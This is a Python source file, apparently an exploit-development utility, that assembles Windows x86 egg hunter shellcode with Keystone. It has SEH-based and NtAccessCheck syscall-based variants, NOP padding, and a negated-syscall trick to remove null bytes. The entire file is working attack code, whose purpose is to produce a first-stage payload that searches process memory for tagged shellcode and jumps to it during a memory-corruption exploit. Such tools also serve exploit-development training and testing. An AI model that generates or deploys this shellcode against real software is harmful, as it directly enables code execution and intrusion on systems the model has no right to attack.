import sys
import argparse
from keystone import Ks, KS_ARCH_X86, KS_MODE_32


def setup_arguments():
    parser = argparse.ArgumentParser(description="EggHunter Generator.")
    parser.add_argument(
        "--egg",
        default="w00t",
        help="Egg to use with the egg hunter (default: 'w00t').",
    )
    parser.add_argument(
        "--ntaccess", help="Use NTACCESS based egg hunter, requires a value."
    )
    parser.add_argument("--seh", action="store_true", help="Use SEH based egg hunter.")
    parser.add_argument(
        "--nopbefore",
        type=int,
        default=0,
        help="Number of Nops to add before the Egghunter.",
    )
    parser.add_argument(
        "--nopafter",
        type=int,
        default=0,
        help="Number of Nops to add after the Egghunter.",
    )
    return parser.parse_args()


def validate_egg(egg):
    if len(egg) != 4:
        sys.exit("[!] The EGG must be exactly 4 characters long and be half of the pattern in the shellcode eg w00t here and w00tw00t in payload.")


def calculate_negated_syscall(syscall_num):
    syscall_int = int(syscall_num, 16)
    negated_syscall = 0x100000000 - syscall_int
    return format(negated_syscall, "08x")


def string_to_hex(string):
    return "".join(format(ord(c), "02x") for c in string)


def to_little_endian(hex_string):
    return bytes.fromhex(hex_string)[::-1].hex()


def generate_egghunter(assembly_code):
    ks              = Ks(KS_ARCH_X86, KS_MODE_32)
    encoding, _     = ks.asm(assembly_code)
    instructions    = "".join(f"\\x{byte:02x}" for byte in encoding)
    return encoding, instructions


def format_egghunter_output(encoding, instructions, nop_before, nop_after, egg):
    total_size = len(encoding) + nop_before + nop_after
    out = f"[+] Egg: {egg} (Hex: {string_to_hex(egg)})\n"
    out += f"[+] Egg Hunter size: {total_size} bytes\n"
    out += f'[+] egghunter = b"{instructions}"'
    return out


def append_nops(instructions, nop_before, nop_after):
    if nop_before > 0:
        instructions = "\\x90" * nop_before + instructions
    if nop_after > 0:
        instructions += "\\x90" * nop_after
    return instructions


def egghunter_seh(egg, nop_before, nop_after):
    validate_egg(egg)

    hex_word        = string_to_hex(egg)
    little_endian   = to_little_endian(hex_word)

    CODE = f"""
        start:
            jmp get_seh_address;
        build_exception_record:
            pop ecx;
            mov eax, 0x{little_endian};
            push ecx;
            push 0xffffffff;
            xor ebx, ebx;
            mov dword ptr fs:[ebx], esp;
            sub ecx, 0x04;
            add ebx, 0x04;
            mov dword ptr fs:[ebx], ecx;
        is_egg:
            push 0x02;
            pop ecx;
            mov edi, ebx;
            repe scasd;
            jnz loop_inc_one;
            jmp edi;
        loop_inc_page:
            or bx, 0xfff;
        loop_inc_one:
            inc ebx;
            jmp is_egg;
        get_seh_address:
            call build_exception_record;
            push 0x0c;
            pop ecx;
            mov eax, [esp+ecx];
            mov cl, 0xb8;
            add dword ptr ds:[eax+ecx], 0x06;
            pop eax;
            add esp, 0x10;
            push eax;
            xor eax, eax;
            ret;
    """

    encoding, instructions  = generate_egghunter(CODE)
    instructions            = append_nops(instructions, nop_before, nop_after)
    return format_egghunter_output(encoding, instructions, nop_before, nop_after, egg)


def egghunter_nt(egg, ntaccess, nop_before, nop_after):
    validate_egg(egg)

    hex_word        = string_to_hex(egg)
    little_endian   = to_little_endian(hex_word)
    print(f"[*] Word to push: {egg}, {little_endian}")

    CODE = f"""
        loop_inc_page:
            or dx, 0x0fff;
        loop_inc_one:
            inc edx;
        loop_check:
            push edx;
            push 0x{ntaccess};
            pop eax;
            int 0x2e;
            cmp al, 0x05;
            pop edx;
        loop_check_valid:
            je loop_inc_page;
        is_egg:
            mov eax, 0x{little_endian};
            mov edi, edx;
            scasd;
            jnz loop_inc_one;
            scasd;
            jnz loop_inc_one;
        matched:
            jmp edi;
    """

    encoding, instructions = generate_egghunter(CODE)

    if "\\x00" in instructions:
        negated_code = handle_null_bytes(ntaccess, little_endian)
        encoding, instructions = generate_egghunter(negated_code)
        if "\\x00" in instructions:
            sys.exit(f"[-] Null bytes found in negated code. Please try another method.")

    instructions = append_nops(instructions, nop_before, nop_after)
    return format_egghunter_output(encoding, instructions, nop_before, nop_after, egg)


def handle_null_bytes(ntaccess, little_endian):
    print(f"[-] Null bytes detected in the egg hunter")
    if (
        input(
            f"[*] Do you want to use negated syscall to avoid null bytes? (Y/n): "
        ).lower()
        == "n"
    ):
        sys.exit("[!] Please try another method.")

    negated_syscall_hex = calculate_negated_syscall(ntaccess)
    print(f"[+] Using negated syscall value: 0x{negated_syscall_hex}")
    CODE = f"""
        loop_inc_page:
            or dx, 0x0fff;
        loop_inc_one:
            inc edx;
        loop_check:
            push edx;
            mov eax, 0x{negated_syscall_hex};
            neg eax;
            int 0x2e;
            cmp al, 0x05;
            pop edx;
        loop_check_valid:
            je loop_inc_page;
        is_egg:
            mov eax, 0x{little_endian};
            mov edi, edx;
            scasd;
            jnz loop_inc_one;
            scasd;
            jnz loop_inc_one;
        matched:
            jmp edi;
    """
    return CODE


def main():
    args = setup_arguments()

    if args.seh:
        data = egghunter_seh(args.egg, args.nopbefore, args.nopafter)
        print(data)
    if args.ntaccess:
        data = egghunter_nt(args.egg, args.ntaccess, args.nopbefore, args.nopafter)
        print(data)


if __name__ == "__main__":
    main()
